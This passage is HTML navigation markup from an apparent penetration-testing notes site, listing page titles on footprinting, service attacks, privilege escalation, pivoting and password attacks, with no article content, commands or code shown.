md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_11" id="__nav_4_3_1_11" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_11"> <span class="md-ellipsis"> Defensive Considerations </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Defensive Considerations" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_11"> <span class="md-nav__icon md-icon"></span> Defensive Considerations </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/defensive_considerations/hardening_ad/"> <span class="md-ellipsis"> Hardening Active Directory </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/defensive_considerations/additional_auditing_techniques/"> <span class="md-ellipsis"> Additional AD Auditing Techniques </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_2" id="__nav_4_3_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_2"> <span class="md-ellipsis"> Footprinting </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Footprinting" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_2"> <span class="md-nav__icon md-icon"></span> Footprinting </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../footprinting/domain_information/"> <span class="md-ellipsis"> Domain Information </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_2_2" id="__nav_4_3_2_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_2_2"> <span class="md-ellipsis"> Host Based Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Host Based Enumeration" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_2_2"> <span class="md-nav__icon md-icon"></span> Host Based Enumeration </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../footprinting/ftp/"> <span class="md-ellipsis"> FTP </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../footprinting/smb/"> <span class="md-ellipsis"> SMB </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../footprinting/nfs/"> <span class="md-ellipsis"> NFS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../footprinting/dns/"> <span class="md-ellipsis"> DNS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../footprinting/smtp/"> <span class="md-ellipsis"> SMTP </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../footprinting/imap_pop3/"> <span class="md-ellipsis"> IMAP/POP3 </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../footprinting/snmp/"> <span class="md-ellipsis"> SNMP </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../footprinting/mysql/"> <span class="md-ellipsis"> MySQL </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../footprinting/mssql/"> <span class="md-ellipsis"> MSSQL </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../footprinting/ipmi/"> <span class="md-ellipsis"> IPMI </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_2_3" id="__nav_4_3_2_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_2_3"> <span class="md-ellipsis"> Remote Management Protocols </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Remote Management Protocols" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_2_3"> <span class="md-nav__icon md-icon"></span> Remote Management Protocols </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../footprinting/linux_remote_management_protocol/"> <span class="md-ellipsis"> Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../footprinting/windows_remote_management_protocol/"> <span class="md-ellipsis"> Windows </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input checked="" class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_3" id="__nav_4_3_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_3"> <span class="md-ellipsis"> Common Services </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Common Services" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_3"> <span class="md-nav__icon md-icon"></span> Common Services </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../interacting/"> <span class="md-ellipsis"> Interacting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../attacking_ftp/"> <span class="md-ellipsis"> FTP </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../attacking_smb/"> <span class="md-ellipsis"> SMB </span> </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle="toc" id="__toc" type="checkbox"/> <a class="md-nav__link md-nav__link--active" href="./"> <span class="md-ellipsis"> SQL Databases </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../attacking_rdp/"> <span class="md-ellipsis"> RDP </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../attacking_dns/"> <span class="md-ellipsis"> DNS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../attacking_email_services/"> <span class="md-ellipsis"> Email Services </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4" id="__nav_4_3_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4"> <span class="md-ellipsis"> Privilege Escalation </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Privilege Escalation" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_4"> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1" id="__nav_4_3_4_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1"> <span class="md-ellipsis"> Windows </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Windows" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_4_1"> <span class="md-nav__icon md-icon"></span> Windows </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_1" id="__nav_4_3_4_1_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_1"> <span class="md-ellipsis"> Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Enumeration" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_1"> <span class="md-nav__icon md-icon"></span> Enumeration </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/gtlotl/"> <span class="md-ellipsis"> Situational Awareness </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/init_enum/"> <span class="md-ellipsis"> Initial Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/comm_with_ps/"> <span class="md-ellipsis"> Communication with Processes </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_2" id="__nav_4_3_4_1_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_2"> <span class="md-ellipsis"> User Privileges </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="User Privileges" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_2"> <span class="md-nav__icon md-icon"></span> User Privileges </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/seimpersonate_seassignprimarytoken/"> <span class="md-ellipsis"> SeImpersonate and SeAssignPrimaryToken </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/sebugpriv/"> <span class="md-ellipsis"> SeDebugPrivilege </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/setakeownershippriv/"> <span class="md-ellipsis"> SeTakeOwnershipPrivilege </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_3" id="__nav_4_3_4_1_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_3"> <span class="md-ellipsis"> Group Privileges </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Group Privileges" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_3"> <span class="md-nav__icon md-icon"></span> Group Privileges </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/builtin_groups/"> <span class="md-ellipsis"> Windows Built-in Groups </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/eventlog_readers/"> <span class="md-ellipsis"> Event Log Readers </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/dnsadmins/"> <span class="md-ellipsis"> DnsAdmins </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/hyperv_admins/"> <span class="md-ellipsis"> Hyper-V Administrators </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/print_operators/"> <span class="md-ellipsis"> Print Operators </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/server_operators/"> <span class="md-ellipsis"> Server Operators </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_4" id="__nav_4_3_4_1_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_4"> <span class="md-ellipsis"> OS </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="OS" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_4"> <span class="md-nav__icon md-icon"></span> OS </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/user_account_control/"> <span class="md-ellipsis"> User Account Control </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/weak_permissions/"> <span class="md-ellipsis"> Weak Permissions </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/vulnerable_services/"> <span class="md-ellipsis"> Vulnerable Services </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_5" id="__nav_4_3_4_1_5" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_5"> <span class="md-ellipsis"> Credential Theft </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Credential Theft" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_5"> <span class="md-nav__icon md-icon"></span> Credential Theft </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/credential_hunting/"> <span class="md-ellipsis"> Credential Hunting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/other_files/"> <span class="md-ellipsis"> Other Files </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/further_credential_theft/"> <span class="md-ellipsis"> Further Credential Theft </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_1_6" id="__nav_4_3_4_1_6" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_1_6"> <span class="md-ellipsis"> Additional Techniques </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Additional Techniques" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_1_6"> <span class="md-nav__icon md-icon"></span> Additional Techniques </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/interacting_with_users/"> <span class="md-ellipsis"> Interacting with Users </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/windows/miscellaneous_techniques/"> <span class="md-ellipsis"> Miscellaneous Techniques </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_2" id="__nav_4_3_4_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_2"> <span class="md-ellipsis"> Linux </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Linux" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_4_2"> <span class="md-nav__icon md-icon"></span> Linux </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/linux/enumeration/"> <span class="md-ellipsis"> Enumeration </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_4_2_2" id="__nav_4_3_4_2_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_4_2_2"> <span class="md-ellipsis"> Local Techniques </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Local Techniques" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_4_2_2"> <span class="md-nav__icon md-icon"></span> Local Techniques </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/linux/kernel_exploits/"> <span class="md-ellipsis"> Kernel Exploits </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/linux/vulnerable_services/"> <span class="md-ellipsis"> Vulnerable Services </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/linux/cron_jobs/"> <span class="md-ellipsis"> Cron Jobs </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/linux/special_permissions/"> <span class="md-ellipsis"> Special Permissions </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/linux/sudo_rights_abuse/"> <span class="md-ellipsis"> Sudo Rights Abuse </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/linux/path_abuse/"> <span class="md-ellipsis"> Path Abuse </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/linux/wilcard_abuse/"> <span class="md-ellipsis"> Wildcard Abuse </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/linux/credential_hunting/"> <span class="md-ellipsis"> Credential Hunting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/linux/shared_libraries/"> <span class="md-ellipsis"> Shared Libraries </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/linux/shared_object_hijacking/"> <span class="md-ellipsis"> Shared Object Hijacking </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/linux/privileged_groups/"> <span class="md-ellipsis"> Privileged Groups </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../privesc/linux/misc_techniques/"> <span class="md-ellipsis"> Miscellaneous Techniques </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_5" id="__nav_4_3_5" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_5"> <span class="md-ellipsis"> File Transfers </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="File Transfers" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_5"> <span class="md-nav__icon md-icon"></span> File Transfers </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_5_1" id="__nav_4_3_5_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_5_1"> <span class="md-ellipsis"> File Tranfer Methods </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="File Tranfer Methods" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_5_1"> <span class="md-nav__icon md-icon"></span> File Tranfer Methods </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../file_transfers/windows_file_transfer_methods/"> <span class="md-ellipsis"> Windows </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../file_transfers/linux_file_transfer_methods/"> <span class="md-ellipsis"> Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../file_transfers/transfering_files_w_code/"> <span class="md-ellipsis"> Transfering Files with Code </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../file_transfers/miscellaneous_file_transfer_methods/"> <span class="md-ellipsis"> Miscellaneous </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../file_transfers/protected_file_transfers/"> <span class="md-ellipsis"> Protected File Transfers </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../file_transfers/catching_files_over_https/"> <span class="md-ellipsis"> Catching Files over HTTP/S </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../file_transfers/living_off_the_land/"> <span class="md-ellipsis"> LOTL </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_6" id="__nav_4_3_6" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_6"> <span class="md-ellipsis"> Tools </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Tools" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_6"> <span class="md-nav__icon md-icon"></span> Tools </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../tools/nmap/"> <span class="md-ellipsis"> Nmap </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_6_2" id="__nav_4_3_6_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_6_2"> <span class="md-ellipsis"> MSF </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="MSF" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_6_2"> <span class="md-nav__icon md-icon"></span> MSF </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_6_2_1" id="__nav_4_3_6_2_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_6_2_1"> <span class="md-ellipsis"> Components </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Components" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_6_2_1"> <span class="md-nav__icon md-icon"></span> Components </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../tools/msf/components/msf_modules/"> <span class="md-ellipsis"> Modules </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../tools/msf/components/msf_targets/"> <span class="md-ellipsis"> Targets </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../tools/msf/components/msf_payloads/"> <span class="md-ellipsis"> Payloads </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_6_2_2" id="__nav_4_3_6_2_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_6_2_2"> <span class="md-ellipsis"> Sessions </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Sessions" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_6_2_2"> <span class="md-nav__icon md-icon"></span> Sessions </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../tools/msf/sessions/msf_sessions_jobs/"> <span class="md-ellipsis"> Sessions &amp; Jobs </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../tools/msf/sessions/msf_sessions_meterpreter/"> <span class="md-ellipsis"> Meterpreter </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../tools/msf/additional_features/evasion/"> <span class="md-ellipsis"> Evasion </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_7" id="__nav_4_3_7" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_7"> <span class="md-ellipsis"> Password Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Password Attacks" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_7"> <span class="md-nav__icon md-icon"></span> Password Attacks </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_7_1" id="__nav_4_3_7_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_7_1"> <span class="md-ellipsis"> Remote Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Remote Attacks" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_7_1"> <span class="md-nav__icon md-icon"></span> Remote Attacks </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../password_attacks/remote_password_attacks/network_services/"> <span class="md-ellipsis"> Network Services </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../password_attacks/remote_password_attacks/password_mutations/"> <span class="md-ellipsis"> Password Mutations </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_7_2" id="__nav_4_3_7_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_7_2"> <span class="md-ellipsis"> Windows Local Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Windows Local Attacks" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_7_2"> <span class="md-nav__icon md-icon"></span> Windows Local Attacks </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../password_attacks/windows_local_password_attacks/attacking_sam/"> <span class="md-ellipsis"> Attacking Sam </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../password_attacks/windows_local_password_attacks/attacking_lsass/"> <span class="md-ellipsis"> Attacking LSASS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../password_attacks/windows_local_password_attacks/attacking_ad_ntdsdit/"> <span class="md-ellipsis"> Attacking AD &amp; NTDS.dit </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../password_attacks/windows_local_password_attacks/credential_hunting/"> <span class="md-ellipsis"> Credential Hunting </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_7_3" id="__nav_4_3_7_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_7_3"> <span class="md-ellipsis"> Linux Local Attacks </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Linux Local Attacks" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_7_3"> <span class="md-nav__icon md-icon"></span> Linux Local Attacks </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../password_attacks/linux_local_password_attacks/credential_hunting/"> <span class="md-ellipsis"> Credential Hunting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../password_attacks/linux_local_password_attacks/passwd_shadow_opasswd/"> <span class="md-ellipsis"> Passwd, Shadow, Opasswd </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_7_4" id="__nav_4_3_7_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_7_4"> <span class="md-ellipsis"> Cracking Files </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Cracking Files" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_7_4"> <span class="md-nav__icon md-icon"></span> Cracking Files </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../password_attacks/cracking_files/protected_files/"> <span class="md-ellipsis"> Protected Files </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../password_attacks/cracking_files/protected_archives/"> <span class="md-ellipsis"> Protected Archives </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_8" id="__nav_4_3_8" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_8"> <span class="md-ellipsis"> Pivoting </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Pivoting" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_8"> <span class="md-nav__icon md-icon"></span> Pivoting </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../ptpf/dynamic_port_forwarding_ssh/"> <span class="md-ellipsis"> Dynamic Port Forwarding w/ SSH and SOCKS Tunneling </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../ptpf/remote_reverse_port_forwarding_ssh/"> <span class="md-ellipsis"> Remote/Reverse Port Forwarding w/ SSH </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../ptpf/meterpreter_tunneling_and_port_forwarding/"> <span class="md-ellipsis"> Meterpreter Tunneling &amp; Port Forwarding </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_8_4" id="__nav_4_3_8_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_8_4"> <span class="md-ellipsis"> Socat </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Socat" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_8_4"> <span class="md-nav__icon md-icon"></span> Socat </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../ptpf/socat/socat_reverse_shell/"> <span class="md-ellipsis"> Reverse Shell </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../ptpf/socat/socat_bind_shell/"> <span class="md-ellipsis"> Bind Shell </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../ptpf/obstacles/ssh_for_win_plink/"> <span class="md-ellipsis"> SSH for Windows: plink </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../ptpf/obstacles/ssh_pivoting_sshuttle/"> <span class="md-ellipsis"> SSH Pivoting w/ Sshuttle </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../ptpf/obstacles/webserver_pivoting_rpivot/"> <span class="md-ellipsis"> WebServer Pivoting w/ Rpivot </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../ptpf/obstacles/port_forwarding_windows_netsh/"> <span class="md-ellipsis"> Port Forwarding Windows: Netsh </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../ptpf/dns_tunneling_dnscat2/"> <span class="md-ellipsis"> DNS Tunneling w/ Dnscat2 </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../ptpf/socks5_tunneling_chisel/"> <span class="md-ellipsis"> SOCKS5 Tunneling with Chisel </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../ptpf/icmp_tunneling_socks/"> <span class="md-ellipsis"> ICMP Tunneling with SOCKS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../ptpf/rdp_socks_tunneling_socksoverrdp/"> <span class="md-ellipsis"> RDP and SOCKS Tunneling w/ SocksOverRDP </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_9" id="__nav_4_3_9" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_9"> <span class="md-ellipsis"> Web </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Web" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_9"> <span class="md-nav__icon md-icon"></span> Web </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_9_1" id="__nav_4_3_9_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_9_1"> <span class="md-ellipsis"> Information Gathering </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Information Gathering" class="md-nav" data-md-level="4"> <label class="md-nav__title" 